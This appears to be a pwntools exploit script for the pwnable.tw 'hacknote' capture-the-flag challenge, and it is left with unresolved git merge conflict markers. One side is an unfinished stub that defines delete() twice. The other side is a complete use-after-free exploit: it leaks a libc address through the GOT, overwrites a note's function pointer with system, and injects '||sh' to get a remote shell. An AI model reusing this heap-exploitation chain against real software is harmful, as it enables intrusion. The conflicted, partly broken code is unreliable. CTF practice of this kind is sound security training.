#!/usr/bin/env python
<<<<<<< HEAD

from pwn import *

context.clear(kernel="amd64", os="linux", log_level="debug")
'''
1.and Add note          
 2. Delete note       
  3. Print note        
   4. Exit      
'''

def run():
    r=process("./hacknote")
    r.recvuntil("Your choice :")
    return r

def add(size, msg):
    r.sendline("1")
    r.sendlineafter("size:",str(size))
    r.sendlineafter("Content :", msg)

def delete(idx):
    r.sendline("2")
    r.sendlineafter("Index :",str(idx))

def delete(idx):
    r.sendline("3")
    r.sendlineafter("Index :",str(idx))

if __name__=="__main__":
    run()
    add(24,"A"*24)
    add(24,"B"*24)

=======
from pwn import *

LOCAL=False

if LOCAL==True:
    context(log_level='debug', os="linux", arch="i386")
    io = process("./hacknote")
    LIBC_PATH="/lib/i386-linux-gnu/libc.so.6"
    libc=ELF(LIBC_PATH)
else:
    context(log_level='info', os="linux", arch="i386")
    io = remote ( "chall.pwnable.tw" , 10102 )
    LIBC_PATH="./libc_32.so.6"
    libc=ELF(LIBC_PATH)

def add_note(size,content):
	io .recvuntil ( "Your choice :" )
	io .sendline (str ( 1 ))
	io .recvuntil ( "Note size :" )
	io .sendline (str (size))
	io .recvuntil ( "Content :" )
	io .sendline (content)

def delete_note(id):
	io .recvuntil ( "Your choice :" )
	io .sendline (str ( 2 ))
	io .recvuntil ( "Index :" )
	io .sendline (str (id))

def print_note(id):
	io .recvuntil ( "Your choice :" )
	io .sendline (str ( 3 ))
	io .recvuntil ( "Index :" )
	io .sendline (str (id))

read_got = 0x0804A00C
puts_content = 0x0804862b

#pid=util.proc.pidof(io)[0]

add_note(24,'a' * 24)
add_note(24, 'b' * 24)
delete_note(1)
delete_note(0)
add_note(8,p32(puts_content)+p32(read_got))
print_note(1)
read_addr=u32(io.recv(4))
libc_base=read_addr-libc.symbols["read"]
system=libc_base+libc.symbols["system"]
log.info("read @ 0x{:x}".format(read_addr))
log.info("libc @ 0x{:x}".format(libc_base))
#util.proc.wait_for_debugger(pid)
delete_note(2)
add_note(8,p32(system)+"||sh")
print_note(1)
io.interactive()
io.close()
>>>>>>> f06fb002a01bf7e05be5c581856e3dacd8bea4ac
